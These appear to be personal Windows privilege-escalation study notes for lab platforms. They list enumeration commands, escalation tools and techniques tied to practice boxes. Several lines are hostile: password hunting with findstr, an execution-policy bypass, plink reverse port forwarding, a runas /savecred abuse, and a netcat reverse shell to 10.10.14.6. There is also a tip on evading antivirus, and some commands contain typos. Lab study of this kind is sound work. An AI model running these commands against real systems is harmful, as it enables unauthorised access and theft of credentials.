
- [Fuzzy Security Guide](https://www.fuzzysecurity.com/tutorials/16.html)
- [PayloadsAllTheThings Guide](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Absolomb Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [Sushant 747's Guide (Country dependant - may need VPN)](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- [Course Resources](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources)
- [Alternate Data Streams](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)
## Initial Enumeration
- System Enumeration
	- `systeminfo` 
	- `systeminfo | findstr /b /c:"OS Name" /c:"OS Versoin" /c:"System Type" `
	- `wmic qfe `
	- `wmic qfe Caption,Description,HotFixID,InstalledOn` 
	- `wmic logicaldisk `
	- `wmic logicaldisk get caption,description,providername` 
	- `wmic logicaldisk get caption`
- User Enumeration
	- `whoami /priv`
	- `whoami /groups`
	- `net user`
	- `net user anurag`
	- `net localgroup`
	- `net localgriup Administrators`
- Network Enumeration
	- `ipconfig` or `ipconfig /all`
	- `arp -a`
	- `route print`
	- `netstat -ano`
- Password Hunting
	- `findstr /si password *.txt *.ini *.config`
-  AV Enumeration
	- `sc query windefend`
	- `sc queryex type= service`
	- `netsh advfirewall firewall dump`
	- `netsh firewall show state`
	- `netsh firewall show config`

## Automated Tool
- Executables
	- [WinPEAS ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
	- [Seatbelt](https://github.com/GhostPack/Seatbelt) (Compile)
	- [SharpUp](https://github.com/GhostPack/SharpUp) (Compile)
	- [Watson](https://github.com/rasta-mouse/Watson) (Compile)
- PowerShell
	- [Sherlock](https://github.com/rasta-mouse/Sherlock)
	- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)  -- run always
		- To run `powershell -ep bypass` 
		- `, .\PowerUp.ps1` 
		- `Invoke-AllChecks`
	- [JAWS](https://github.com/411Hall/JAWS)
- Other
	- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) (local) -- need system info and run on our system
	- [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)

- [Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

## Escalation Path

####  Kernel Exploits
- Box [Devel](https://anuragtaparia.gitbook.io/write-ups/windows/htb-or-devel)
- What is kernel
![[kernel.png]]
- For Windows
![[windows kernel.png]]
- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits) resource

#### Passwords and Port Forwarding
- Box [ChatterBox](https://anuragtaparia.gitbook.io/write-ups/windows/htb-or-chatterbox)
- Pivoting
	- install ssh on kali `sudo apt install ssh` and change the `PermitRootLogon yes` in `/etc/ssh/sshd_config`  then `service restart ssh` 
		- also change the port from 22 to 2222 if giving 'Network error: Connection timed out'
	- `plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.16`  
		- The command connects to the remote SSH server at `10.10.14.16` with the username `root` and password `toor`. It sets up remote port forwarding so that any connections made to port `445` on the remote server are forwarded to port `445` on your local machine (local machine is htb box in our case).

#### Windows Subsystem for Linux (WSL)
- Box SecNotes
- check for bash.exe and wsl.exe
- `where /R c:\windows bash.exe `  OR `where /R c:\windows wsl.exe`
- and run bash.exe or `wsl.exe cmd`

#### Impersonation and Potato Attacks
- Box Jeeves
- Refer [this](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges)
- look for `SeAssignPrimaryToken` or `SeImpersonate`
- [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
- [Juicy Potato](https://github.com/ohpe/juicy-potato)
- For meterpreter `exploit/windows/local/ms16_075_reflection_juicy` or `exploit/windows/local/ms16_075_reflection`
- `getsystem` -- meterpreter cmd for impersonation (avoid technique 2 in real world might got caught by AV)
	- [What happens when I type getsystem?](https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/)

#### RunAs
- Box Access
- run `cmdkey /list` -- if there is any stored cred, we can use runas.exe
	- `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"`
	- or for shell
		- On our system -- `nc -nlvp 1234`
		- on box -- `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\security\nc.exe -e C:\Windows\System32\cmd.exe 10.10.14.6 1234"`

#### Registry
- Using THM [Windows PrivEsc Arena](https://tryhackme.com/r/room/windowsprivescarena)
- Registry Escalation - Autorun
- Registry Escalation -  AlwaysInstallElevated
- Service Escalation - Registry

#### Executable Files
- Using THM [Windows PrivEsc Arena](https://tryhackme.com/r/room/windowsprivescarena)
- Service Escalation - Executable Files